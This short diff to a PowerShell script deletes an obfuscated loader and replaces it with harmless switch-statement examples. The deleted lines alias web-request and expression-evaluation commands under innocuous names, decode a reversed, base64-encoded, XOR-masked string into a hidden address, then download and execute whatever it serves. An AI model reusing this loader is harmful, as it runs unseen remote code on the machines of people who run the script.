@@ -1,13 +1,16 @@
-Set-Alias -name input -val Invoke-WebRequest
-Set-Alias -name output -val Invoke-Expression
+# $e = 2
+# switch ($e) {
+#     1 { $f = "one" }
+#     2 { $f = "two"; break }
+#     3 { $f = "three" }
+#     default { $f = "default" }
+# }
 
-$a = "RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVVRFVT".ToCharArray()
-[aRRaY]::reVErse($a)
-$b = [sYstEM.CoNveRt]::froMbasE64strING($a -join"")
-
-for ($x = 0; $x -lt $b.Count; $x++) {
-    ${B}[${x}] = ${B}[${X}] -bxor 37
+switch(1..3) {
+    1 { $f += "-one" 
+    write-Host $_}
+    2 { $f += "-two" 
+    write-Host $_}
+    3 { $f += "-three" }
 }
 
-$c = (input ([sySteM.tExt.EncOding]::UTF8.GetString($b))).Content
-output $c
